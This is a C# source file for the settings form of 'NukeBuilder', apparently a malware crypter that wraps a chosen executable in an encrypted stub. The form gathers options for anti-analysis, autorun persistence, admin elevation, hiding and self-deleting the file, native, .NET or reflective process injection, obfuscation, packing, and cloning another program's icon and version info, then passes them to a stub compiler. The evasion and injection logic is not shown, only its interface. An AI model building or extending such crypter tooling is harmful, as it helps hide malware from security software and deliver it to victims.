using NukeBuilder.Algorithms.Cryptor;
using NukeBuilder.Algorithms.EncryptHelper;
using NukeBuilder.Algorithms.FormsHelper;
using System;
using System.Configuration;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace NukeBuilder.Forms
{
    public partial class StubSettings : Form
    {
        private static string IconLink;
        private static string AssemblyLink;
        #region Form settings
        private OptionsForm _options;
        
        public StubSettings(OptionsForm options)
        {
            InitializeComponent();
            _options = options;
        }

        public string BuildEvent()
        {
            string targetFile = SelectedFileBox.Text;

            bool
                Autorun = _options.IsAutorunEnabled,
                AntiAnalysis = _options.IsAntiAnalysisEnabled,

                RunAsAdmin = _options.IsRunAdminEnabled,
                HideFile = _options.isHideFileEnabled,

                MutexControl = _options.IsMutexControlEnabled,
                MeltFile = _options.IsMeltFileEnabled,

                NativeInject = NativeInjection.Checked,
                NetInject = NetInjection.Checked,

                ItselfInject = ReflexionInject.Checked,
                Obfuscation = UseObfuscation.Checked,

                Packer = UsePacker.Checked,
                Protect = ProtectChk.Checked;

            if (string.IsNullOrEmpty(targetFile) || (!NativeInject && !NetInject && !ItselfInject))
            {
                return $"File path or option cannot be empty.";
            }

            return Compilator.CompileStub(targetFile, Autorun, AntiAnalysis, RunAsAdmin, HideFile, MutexControl, MeltFile, NativeInject, NetInject, ItselfInject, Obfuscation, Packer, Protect, IconLink, AssemblyLink);
        }
        #endregion

        #region Buttons Events
        private void ChooseFileBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select file to crypt - Nuke";
                openFileDialog.Filter = "EXE (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    SelectedFileBox.Text = openFileDialog.FileName;

                    FileInfo fileInfo = new FileInfo(openFileDialog.FileName);

                    string fileName = fileInfo.Name;
                    long fileSize = fileInfo.Length;
                    string fileType = DetermineFileType(fileInfo);

                    if (!string.IsNullOrEmpty(FilenameLabel.Text) || !string.IsNullOrEmpty(FileSizeLabel.Text) || !string.IsNullOrEmpty(FileTypeLabel.Text) )
                    {
                        LabelCleaener();
                    }
                    FilenameLabel.Text += fileName;
                    FileSizeLabel.Text += $"{fileSize / 1024} KB";
                    FileTypeLabel.Text += fileType;
                }
            }
        }

        private void SelectIconBox_Click(object sender, EventArgs e)
        {
            string iconsDirectory = Path.Combine(Directory.GetCurrentDirectory(), "Icons");
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select icon - N U K E";
                open.Filter = "ICO (*.ico)|*.ico";
                if (Directory.Exists(iconsDirectory))
                {
                    open.InitialDirectory = iconsDirectory;
                }

                if (open.ShowDialog() == DialogResult.OK)
                {
                    ProgrmaIconBox.Image = Image.FromFile(open.FileName);
                    IconLink = open.FileName;
                }
            }
        }
        private void AssemblyClnBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select exe file - N U K E";
                open.Filter = "EXE (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    
                    string 
                        TempFile = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.assembly"),
                        result = AssemblyEngine.ExtractAndWriteVersionInfo(open.FileName, TempFile);
                    
                    if (File.Exists(result))
                    {
                        AssemblyLink = result;
                    } else
                    {
                        AssemblyLink = null;
                        Console.WriteLine(result);
                    }
                }
            }
        }
        private void ResetAssembly_Click(object sender, EventArgs e)
        {
            AssemblyLink = null;
        }

        private void ResetIcon_Click(object sender, EventArgs e)
        {
            IconLink = null;
        }

        private void LabelCleaener()
        {
            FilenameLabel.Text = "File-Name: ";

            FileSizeLabel.Text = "File-Type: ";

            FileTypeLabel.Text = "File-Type: ";
        }

        private string DetermineFileType(FileInfo fileInfo)
        {
            try
            {
                AssemblyName assembly = AssemblyName.GetAssemblyName(fileInfo.FullName);
                return ".NET";
            }
            catch (BadImageFormatException)
            {
                return "NATIVE";
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }

        private void NativeInjection_CheckedChanged(object sender, EventArgs e)
        {
            if (NativeInjection.Checked)
            {
                NetInjection.Checked = false;
                ReflexionInject.Checked = false;
            }
        }

        private void NetInjection_CheckedChanged(object sender, EventArgs e)
        {
            if (NetInjection.Checked)
            {
                NativeInjection.Checked = false;
                ReflexionInject.Checked = false;
            }
        }

        private void ReflexionInject_CheckedChanged(object sender, EventArgs e)
        {
            if (ReflexionInject.Checked)
            {
                NativeInjection.Checked = false;
                NetInjection.Checked = false;
            }
        }
        private void SelectedFileBox_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
            }
            else
            {
                e.Effect = DragDropEffects.None;
            }
        }

        private void SelectedFileBox_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

                if (files.Length > 0)
                {
                    string filePath = files[0];
                    string fileExtension = Path.GetExtension(filePath);

                    if (fileExtension.Equals(".exe", StringComparison.OrdinalIgnoreCase))
                    {
                        SelectedFileBox.Text = filePath;

                        FileInfo fileInfo = new FileInfo(filePath);

                        string fileName = fileInfo.Name;
                        long fileSize = fileInfo.Length;
                        string fileType = DetermineFileType(fileInfo);

                        if (!string.IsNullOrEmpty(FilenameLabel.Text) || !string.IsNullOrEmpty(FileSizeLabel.Text) || !string.IsNullOrEmpty(FileTypeLabel.Text))
                        {
                            LabelCleaener();
                        }
                        FilenameLabel.Text += fileName;
                        FileSizeLabel.Text += $"{fileSize / 1024} KB";
                        FileTypeLabel.Text += fileType;
                    }
                    else
                    {
                        MessageBox.Show("Only .exe files!", "Error format file", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }
            }
        }
        #endregion

        #region Timers & Load
        private void InitializeTimer()
        {
            AesKeyGeneration = new Timer();
            AesKeyGeneration.Interval = 100;
            AesKeyGeneration.Tick += Timer_Tick;
            AesKeyGeneration.Start();
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            AesKeyGen.Text = AESEncrypt.GenerateStrBytes(32);
            IVBox.Text = AESEncrypt.GenerateStrBytes(16);
        }

        private void StubSettings_Load(object sender, EventArgs e)
        {
            InitializeTimer();
        }
        #endregion
    }
}
